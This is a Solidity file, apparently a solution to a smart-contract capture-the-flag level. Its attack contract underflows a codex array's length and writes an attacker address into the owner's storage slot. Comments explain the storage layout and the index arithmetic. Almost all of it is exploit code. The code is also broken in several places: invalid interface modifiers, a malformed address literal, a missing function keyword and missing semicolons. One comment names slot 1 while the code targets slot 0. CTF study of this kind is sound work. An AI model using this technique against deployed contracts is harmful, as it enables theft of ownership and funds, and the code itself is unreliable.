// Slot 0 = 0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
//         |      24 nibbles=12bytes |  40 nibbles = 20bytes                  |
//         |      11bytes| boolean contacted |  20bytes owner                 |
// Slot 1 = | length of the array (integer) |

// Slot [uint256(keccak256(1)) + 0]  = first element
// Slot [uint256(keccak256(1)) + 1]  = second element

// uint256(keccak256(1)) = 0xbc36789e7a1e281436464229828f817d6612f7b477d66591ff96a9e064bcc98a
// as a decimal 85131057757245807317576516368191972321038229705283732634690444270750521936266

// AIM is to replace storage slot 1 with our address:
// 0x000000000000000000000000935902bC8136E3477Bfc420f68CA98297196c1C1

pragma solidity ^0.6.0;

interface ICodex {
    function make_contact() external;

    function record(bytes32 _content) external contacted;

    function retract() external contacted;

    function revise(uint256 i, bytes32 _content) external contacted;
}

contract AttackCodex {
    ICodex level; 
    constructor(){
        level = ICodex("0x59CB0A4babd506be33EA0db70b937a8A4Dd5DfD7"));
    }

    attack(){
        // pass the modifier
        level.make_contact()
        // overflow the codex length
        level.retract()
        // now we need to modify slot 0.
        // the equation that governs this for a dynamic array at slot 1 is:
        // slot number = uint256(keccak(1)) + N  = 0 
        // We need to overflow 2^256 
        // uint256(keccak(1)) + N = 2^256
        // N = web3.utils.toBN('115792089237316195423570985008687907853269984665640564039457584007913129639936').sub(web3.utils.toBN(web3.utils.keccak256('0x1'))).toString()
        // N = '72412505182528709039998379046085362850601968682154630550920834895083236163630'
        
        uint256 N = 72412505182528709039998379046085362850601968682154630550920834895083236163630;
        bytes32 content = 0x000000000000000000000000935902bC8136E3477Bfc420f68CA98297196c1C1;
        level.revise(N, content);
    }    

}
